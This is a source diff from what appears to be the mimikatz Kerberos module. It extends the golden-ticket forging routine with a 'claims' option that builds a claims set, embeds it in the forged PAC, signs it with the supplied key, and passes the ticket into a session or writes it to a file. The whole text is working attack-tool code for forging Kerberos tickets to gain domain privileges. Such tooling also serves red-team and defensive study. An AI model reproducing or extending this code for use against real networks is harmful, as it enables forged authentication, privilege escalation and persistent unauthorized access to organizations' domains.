@@ -412,11 +412,12 @@ NTSTATUS kuhl_m_kerberos_golden(int argc, wchar_t * argv[])
 {
 	BYTE key[AES_256_KEY_LENGTH] = {0};
 	DWORD i, j, nbGroups, nbSids = 0, id = 500, keyType, rodc = 0;
-	PCWCHAR szUser, szDomain, szService = NULL, szTarget = NULL, szSid, szKey = NULL, szId, szGroups, szSids, szRodc, szLifetime, base, filename;
+	PCWCHAR szUser, szDomain, szService = NULL, szTarget = NULL, szSid, szKey = NULL, szId, szGroups, szSids, szRodc, szLifetime, szClaims, base, filename;
 	PWCHAR baseSid, tmpSid, baseDot, netbiosDomain;
 	PISID pSid, pSidTmp;
 	PGROUP_MEMBERSHIP dynGroups = NULL, groups;
 	PKERB_SID_AND_ATTRIBUTES sids = NULL;
+	PCLAIMS_SET pClaimsSet = NULL;
 	PBERVAL BerApp_KrbCred;
 	KUHL_M_KERBEROS_LIFETIME_DATA lifeTimeData;
 	BOOL isPtt = kull_m_string_args_byName(argc, argv, L"ptt", NULL, NULL);
@@ -528,6 +529,8 @@ NTSTATUS kuhl_m_kerberos_golden(int argc, wchar_t * argv[])
 										}
 									}
 								}
+								if(kull_m_string_args_byName(argc, argv, L"claims", &szClaims, NULL))
+									pClaimsSet = kuhl_m_kerberos_claims_createFromString(szClaims);
 
 								status = CDLocateCSystem(keyType, &pCSystem);
 								if(NT_SUCCESS(status))
@@ -560,6 +563,11 @@ NTSTATUS kuhl_m_kerberos_golden(int argc, wchar_t * argv[])
 												kprintf(L" ; ");
 											}
 										}
+										if(pClaimsSet)
+										{
+											kprintf(L"\nClaims    :\n");
+											kuhl_m_kerberos_claims_displayClaimsSet(pClaimsSet);
+										}
 										kprintf(L"\nServiceKey: ");
 										kull_m_string_wprintf_hex(key, pCSystem->KeySize, 0); kprintf(L" - %s\n", kuhl_m_kerberos_ticket_etype(keyType));
 										if(szService)
@@ -573,7 +581,7 @@ NTSTATUS kuhl_m_kerberos_golden(int argc, wchar_t * argv[])
 
 										kprintf(L"-> Ticket : %s\n\n", isPtt ? L"** Pass The Ticket **" : filename);
 
-										if(BerApp_KrbCred = kuhl_m_kerberos_golden_data(szUser, szDomain, netbiosDomain, szService, szTarget, &lifeTimeData, pSid, key, pCSystem->KeySize, keyType, id, groups, nbGroups, sids, nbSids, rodc))
+										if(BerApp_KrbCred = kuhl_m_kerberos_golden_data(szUser, szDomain, netbiosDomain, szService, szTarget, &lifeTimeData, pSid, key, pCSystem->KeySize, keyType, id, groups, nbGroups, sids, nbSids, rodc, pClaimsSet))
 										{
 											if(isPtt)
 											{
@@ -617,6 +625,9 @@ NTSTATUS kuhl_m_kerberos_golden(int argc, wchar_t * argv[])
 			LocalFree(sids[i].Sid);
 		LocalFree(sids);
 	}
+	if(pClaimsSet)
+		kuhl_m_kerberos_claims_free(pClaimsSet);
+
 	return STATUS_SUCCESS;
 }
 
@@ -652,7 +663,7 @@ NTSTATUS kuhl_m_kerberos_encrypt(ULONG eType, ULONG keyUsage, LPCVOID key, DWORD
 	return status;
 }
 
-PBERVAL kuhl_m_kerberos_golden_data(LPCWSTR username, LPCWSTR domainname, LPCWSTR LogonDomainName, LPCWSTR servicename, LPCWSTR targetname, PKUHL_M_KERBEROS_LIFETIME_DATA lifetime, PISID sid, LPCBYTE key, DWORD keySize, DWORD keyType, DWORD userid, PGROUP_MEMBERSHIP groups, DWORD cbGroups, PKERB_SID_AND_ATTRIBUTES sids, DWORD cbSids, DWORD rodc)
+PBERVAL kuhl_m_kerberos_golden_data(LPCWSTR username, LPCWSTR domainname, LPCWSTR LogonDomainName, LPCWSTR servicename, LPCWSTR targetname, PKUHL_M_KERBEROS_LIFETIME_DATA lifetime, PISID sid, LPCBYTE key, DWORD keySize, DWORD keyType, DWORD userid, PGROUP_MEMBERSHIP groups, DWORD cbGroups, PKERB_SID_AND_ATTRIBUTES sids, DWORD cbSids, DWORD rodc, PCLAIMS_SET pClaimsSet)
 {
 	NTSTATUS status;
 	KIWI_KERBEROS_TICKET ticket = {0};
@@ -734,7 +745,7 @@ PBERVAL kuhl_m_kerberos_golden_data(LPCWSTR username, LPCWSTR domainname, LPCWST
 		SignatureType = KERB_CHECKSUM_HMAC_MD5;
 	}
 	
-	if(kuhl_m_pac_validationInfo_to_PAC(&validationInfo, SignatureType, &pacType, &pacTypeSize))
+	if(kuhl_m_pac_validationInfo_to_PAC(&validationInfo, SignatureType, pClaimsSet, &pacType, &pacTypeSize))
 	{
 		kprintf(L" * PAC generated\n");
 		status = kuhl_m_pac_signature(pacType, pacTypeSize, SignatureType, key, keySize);
